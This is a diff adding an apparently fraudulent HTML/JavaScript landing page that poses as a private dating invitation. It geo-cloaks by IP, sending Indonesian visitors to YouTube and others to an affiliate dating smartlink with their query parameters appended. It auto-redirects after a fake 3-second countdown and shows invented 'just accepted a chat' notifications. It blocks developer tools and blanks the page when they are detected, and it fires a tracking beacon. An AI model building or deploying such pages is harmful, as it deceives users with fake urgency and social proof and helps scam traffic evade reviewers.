@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💬 You Have a New Invitation</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;background:#000;overflow:hidden;height:100vh;color:#fff;position:relative;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
+
+        /* --- VIDEO BACKGROUND --- */
+        .bg-video{position:absolute;top:50%;left:50%;min-width:100%;min-height:100%;width:auto;height:auto;transform:translate(-50%,-50%);z-index:-2;object-fit:cover;pointer-events:none}
+        .blur-content{background:rgba(0,0,0,0.55); backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
+
+        /* --- KONTEN UTAMA --- */
+        .container {
+            max-width: 400px;
+            width: 90%;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #fff, #ff416c);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #e0e0e0;
+            margin-bottom: 25px;
+        }
+
+        /* --- ANIMASI IKON CHAT --- */
+        .chat-icon {
+            width: 150px;
+            height: 150px;
+            margin: 20px auto;
+            background: linear-gradient(135deg, #ff416c, #ff4b2b);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 70px;
+            color: #fff;
+            box-shadow: 0 0 40px rgba(255, 65, 108, 0.6);
+            animation: pulse 2s infinite, glow 3s infinite alternate;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+            position: relative;
+        }
+        .chat-icon:hover { transform: scale(1.05); }
+        .notification-dot {
+            position: absolute;
+            top: 20px;
+            right: 25px;
+            width: 30px;
+            height: 30px;
+            background: #ff0000;
+            border: 3px solid #fff;
+            border-radius: 50%;
+            animation: blink 1.5s infinite;
+        }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        @keyframes glow { from { box-shadow: 0 0 30px rgba(255, 65, 108, 0.6); } to { box-shadow: 0 0 50px rgba(255, 65, 108, 0.9), 0 0 70px rgba(255, 65, 108, 0.7); } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+
+        /* --- TIMER & CTA --- */
+        .countdown-container { margin: 25px 0; font-size: 18px; color: #ff4d4d; }
+        .countdown-container .timer { font-size: 48px; font-weight: bold; color: #ff416c; text-shadow: 0 0 10px rgba(255, 65, 108, 0.7); }
+        .cta-button {
+            width: 100%; padding: 18px; font-size: 18px; font-weight: bold;
+            background: linear-gradient(45deg, #ff416c, #ff4b2b); color: white; border: none; border-radius: 50px;
+            cursor: pointer; box-shadow: 0 5px 20px rgba(255, 65, 108, 0.4);
+            transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
+        .cta-button:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6); }
+        .cta-button:disabled { background: #555; cursor: not-allowed; transform: none; }
+        .footer-text { margin-top: 20px; font-size: 12px; color: #aaa; }
+
+        /* --- NOTIFIKASI AKTIVITAS --- */
+        .activity-notification {
+            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+            background: rgba(40, 40, 40, 0.95); color: #fff; padding: 12px 20px; border-radius: 30px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3); z-index: 1000; opacity: 0;
+            transition: opacity 0.5s ease; font-size: 14px; border-left: 4px solid #25d366;
+        }
+        .activity-notification.show { opacity: 1; }
+
+        /* --- LOADING OVERLAY --- */
+        .loading-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); display: flex; flex-direction: column;
+            justify-content: center; align-items: center; z-index: 3000;
+        }
+        .loading-spinner {
+            width: 60px; height: 60px; border: 5px solid #333; border-top: 5px solid #ff416c;
+            border-radius: 50%; animation: spin 1s linear infinite;
+        }
+        .loading-text { margin-top: 20px; color: #e0e0e0; font-size: 16px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Finding your match...</div>
+    </div>
+
+    <!-- Video Background -->
+    <video class="bg-video" id="bgVideo" autoplay muted loop playsinline preload="auto"></video>
+
+    <!-- Konten Utama dengan Efek Blur -->
+    <div class="blur-content" id="mainContent" style="display: none;">
+        <div class="container">
+            <h1>💬 You Have a Private Invitation</h1>
+            <p class="subtitle">A verified user nearby wants to connect. See who it is before the invitation expires!</p>
+
+            <div class="chat-icon" id="chatIcon">
+                <i class="fas fa-comment-dots"></i>
+                <div class="notification-dot"></div>
+            </div>
+
+            <div class="countdown-container">
+                <p>Invitation expires in...</p>
+                <div class="timer" id="timer">3</div>
+            </div>
+
+            <button class="cta-button" id="ctaButton">
+                <i class="fas fa-heart"></i>
+                <span>Accept & Chat Now</span>
+            </button>
+
+            <p class="footer-text">
+                This is a one-time invitation. It will be <strong>permanently deleted</strong> if you don't accept.
+            </p>
+        </div>
+    </div>
+
+    <!-- Template Notifikasi (disembunyikan) -->
+    <div class="activity-notification" id="notificationTemplate"></div>
+
+    <script>
+        // --- VARIABEL GLOBAL ---
+        let redirectUrl;
+        let countdownInterval;
+
+        // --- DAFTAR VIDEO BACKGROUND ---
+        const videoList = [
+            "https://files.catbox.moe/387f3z.mp4",
+            "https://files.catbox.moe/y2fr1u.mp4",
+            "https://files.catbox.moe/o2bcz2.mp4",
+            "https://files.catbox.moe/jytnih.mp4",
+            "https://files.catbox.moe/1q99k0.mp4",
+            "https://files.catbox.moe/wkzv09.mp4",
+            "https://files.catbox.moe/9v2zxi.mp4",
+            "https://thumbsnap.com/i/37t8zezA.mp4",
+            "https://thumbsnap.com/i/2ycQSNZa.mp4",
+            "https://thumbsnap.com/i/AY9zveVs.mp4",
+            "https://thumbsnap.com/i/gzm5dPiX.mp4",
+            "https://assets.mixkit.co/videos/preview/mixkit-set-of-abstract-circles-loop-11805-large.mp4"
+        ];
+
+        // --- FUNGSI UNTUK MEMUAT VIDEO ACAK ---
+        function loadRandomVideo() {
+            const videoEl = document.getElementById('bgVideo');
+            const idx = Math.floor(Math.random() * videoList.length);
+            videoEl.src = videoList[idx];
+            videoEl.load();
+            videoEl.play().catch(error => {
+                console.error("Video failed to play, trying next one...", error);
+                videoList.splice(idx, 1); // Hapus video yang gagal
+                if (videoList.length > 0) {
+                    loadRandomVideo(); // Coba video lain
+                } else {
+                    // Fallback jika semua video gagal
+                    document.body.style.background = 'linear-gradient(45deg, #1a0033, #4b0082)';
+                }
+            });
+        }
+
+        // --- DETEKSI NEGARA (LEBIH CEPAT) ---
+        async function detectCountry() {
+            try {
+                const countryDetectionPromises = [
+                    fetch('https://ipapi.co/json/').then(res => res.json()).then(data => ({ code: data.country_code, source: 'ipapi' })),
+                    fetch('https://ip-api.com/json/?fields=countryCode').then(res => res.json()).then(data => ({ code: data.countryCode, source: 'ip-api' }))
+                ];
+                const result = await Promise.race(countryDetectionPromises);
+                console.log(`Detected country (${result.source}):`, result.code);
+
+                if (result.code === 'ID') {
+                    redirectUrl = 'https://www.youtube.com';
+                    console.log("Indonesian IP detected. Redirecting to:", redirectUrl);
+                    window.location.href = redirectUrl;
+                    return true;
+                } else {
+                    const baseOffers = ["https://ceafgif.flirtpixel.com/s/192278ad6a62d?sub1=KAHF&subsource=KAHF"];
+                    const urlParams = new URLSearchParams(window.location.search);
+                    redirectUrl = baseOffers[0] + (baseOffers[0].includes('?') ? '&' : '?') + urlParams.toString();
+                    console.log("Non-Indonesian IP. Using smartlink:", redirectUrl);
+                    return false;
+                }
+            } catch (error) {
+                console.error("IP detection failed. Using default smartlink.", error);
+                const baseOffers = ["https://ceafgif.flirtpixel.com/s/192278ad6a62d?sub1=KAHF&subsource=KAHF"];
+                const urlParams = new URLSearchParams(window.location.search);
+                redirectUrl = baseOffers[0] + (baseOffers[0].includes('?') ? '&' : '?') + urlParams.toString();
+                return false;
+            }
+        }
+
+        // --- NOTIFIKASI AKTIVITAS DINAMIS ---
+        function showActivityNotification() {
+            const names = ["greysani", "denia", "resinye", "Jessica", "gebrile", "gabriela", "santryne", "sinyle"];
+            const cities = ["dallas", "germany", "australia", "brazil", "united states", "francis", "united kingdom"];
+            const randomName = names[Math.floor(Math.random() * names.length)];
+            const randomCity = cities[Math.floor(Math.random() * cities.length)];
+            
+            const notification = document.getElementById('notificationTemplate').cloneNode(true);
+            notification.id = '';
+            notification.innerHTML = `💕 <strong>${randomName}</strong> from ${randomCity} just accepted a chat!`;
+            document.body.appendChild(notification);
+            
+            setTimeout(() => notification.classList.add('show'), 100);
+            setTimeout(() => {
+                notification.classList.remove('show');
+                setTimeout(() => notification.remove(), 500);
+            }, 3500);
+        }
+
+        // --- LOGIKA COUNTDOWN & REDIRECT ---
+        function startCountdown() {
+            let timeLeft = 3;
+            const timerElement = document.getElementById('timer');
+            const ctaButton = document.getElementById('ctaButton');
+
+            countdownInterval = setInterval(() => {
+                timeLeft--;
+                timerElement.textContent = timeLeft;
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    performRedirect();
+                }
+            }, 1000);
+
+            ctaButton.addEventListener('click', performRedirect);
+            document.getElementById('chatIcon').addEventListener('click', performRedirect);
+        }
+        
+        function performRedirect() {
+            clearInterval(countdownInterval);
+            const ctaButton = document.getElementById('ctaButton');
+            ctaButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Connecting...</span>';
+            ctaButton.disabled = true;
+            console.log("Redirecting to:", redirectUrl);
+            window.location.href = redirectUrl;
+        }
+
+        // --- FUNGSI UTAMA MEMULAI APLIKASI ---
+        async function startApp() {
+            const shouldRedirectNow = await detectCountry();
+            
+            if (!shouldRedirectNow) {
+                document.getElementById('mainContent').style.display = 'flex';
+                document.getElementById('loadingOverlay').style.display = 'none';
+
+                loadRandomVideo(); // Panggil fungsi untuk memuat video
+                startCountdown();
+                
+                showActivityNotification();
+                setInterval(showActivityNotification, 4000);
+
+                fetch('https://imopol.dasboardkramat.workers.dev/track?cid=KAHF', { method: 'GET', keepalive: true });
+            }
+        }
+
+        // --- KEAMANAN ---
+        document.addEventListener('keydown', function(e) {
+            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        setInterval(() => {
+            if ((window.outerHeight - window.innerHeight > 200) || (window.outerWidth - window.innerWidth > 200)) {
+                window.location.replace("about:blank");
+            }
+        }, 500);
+
+        // --- JALANKAN APLIKASI ---
+        window.addEventListener('DOMContentLoaded', startApp);
+
+    </script>
+</body>
+</html>
